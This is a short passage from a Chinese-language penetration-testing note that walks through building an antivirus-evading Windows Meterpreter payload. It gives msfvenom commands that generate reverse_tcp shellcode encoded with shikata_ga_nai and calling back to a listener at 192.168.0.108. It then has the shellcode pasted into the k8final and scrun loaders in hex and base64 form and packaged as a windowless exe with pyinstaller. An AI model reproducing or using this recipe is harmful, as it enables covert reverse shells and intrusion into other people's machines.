  #### hex
	生成c格式payload
	>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=192.168.0.108 lport=12138 -f c -o /var/www/html/shell.c
	下载k8final
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/65.png)

	粘贴shellcode进去
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/66.png)

	使用
	https://github.com/k8gege/scrun

![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/67.png)

	或
	>python scrun.py xxx
	或
	编译ScRunHex.py为exe
  #### Base64(*)
	生成c格式payload
	>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=192.168.0.108 lport=12138 -f c -o /var/www/html/shell.c
	下载k8final

![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/68.png)

	粘贴shellcode进去
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/69.png)

	进行hex编码后，粘贴进去base64编码
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/70.png)

	看系统位数编译ScRunBase.py文件，使用pyinstaller打包为exe后执行
	https://gitee.com/RichChigga/scrun/blob/master/ScRunBase64.py
	>python pyinstaller-script.py -F -w ScRunBase64.py
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/71.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/72.png)